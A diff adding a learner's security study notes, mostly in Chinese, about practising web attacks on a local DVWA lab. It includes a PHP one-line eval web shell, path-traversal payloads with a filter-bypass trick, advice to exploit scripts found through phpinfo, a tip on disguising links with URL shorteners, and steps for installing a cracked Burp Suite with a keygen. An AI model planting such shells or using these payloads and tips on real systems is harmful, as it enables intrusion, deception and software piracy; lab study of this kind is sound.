@@ -1,1 +1,53 @@
-﻿
+﻿1.
+<? php @eval($_POST[666]) ?>
+2.
+DNS, WEB, Internet, Browser
+3.
+net structure(URL):
+protocal://hostheader
+4.
+url ASCII
+5.
+url research:
+http://tool.chinaz.com/tools/urlencode.aspx
+6.
+HTTP(Hyper Transport Protocol)
+7.
+多逛论坛，如安全圈，https://www.anquanquan.info/
+8.
+根据phpinfo中的，脚本文件，到漏洞库查询，并利用；
+9.
+在Url栏输入，about:config
+然后，搜索 network.proxy.allow_hijacking_localhost，改为true
+10.
+使用 DVWA的时候，爆破出现了post，一直出现输入正确密码也是无法通过；
+出现get就可以，区别在哪里
+10.2
+设置了计算机-设置-代理-使用代理服务器127.0.0.1 8080(已验证过不是这个原因)
+这时用这个http://localhost/dvwa-master/vulnerabilities/brute/访问的
+GET /dvwa-master/vulnerabilities/brute/?username=admin&password=password&Login=Login HTTP/1.1
+输入正确密码可以通过；
+不知道更改了哪里
+11.
+XAMPP Control Pannel，搭建环境，apache, mysql
+然后在localhost/dvwa-master/打开；
+12.
+安装burp suite v2.1破解版遇到的问题，需要Java环境，
+此版本可以匹配java 8,过高安装会出错；解压后直接点击burp-loader-keygen-2
+然后run运行，要记得生成许可文件；
+13.
+百度 短网址生成器，可以长段的网址改为很短的看着正常的网址；
+14.
+URL编码转换 在线转换工具，#用%23代替；
+15.
+返回上层目录，../../../../../../phpstudy_pro/WWW/DVWA-master/phpinfo.php
+如果会被过滤可以双写绕过
+..././..././..././..././..././..././phpstudy_pro/WWW/DVWA-master/phpinfo.php
+可以把http://www.baidu.com写为hthttp://tp://www.baidu.com
+还可能出现需要些file头：
+file:///D:\phpstudy_pro\WWW\DVWA-master\phpinfo.php
+16.
+二进制安全，安装IDA_Pro, Linux gdb, x64dbg, x32dbg;
+17.
+为了节省成本，先大多数app，开发时用的是webapp技术，实际用的是
+打开app访问的是网页；
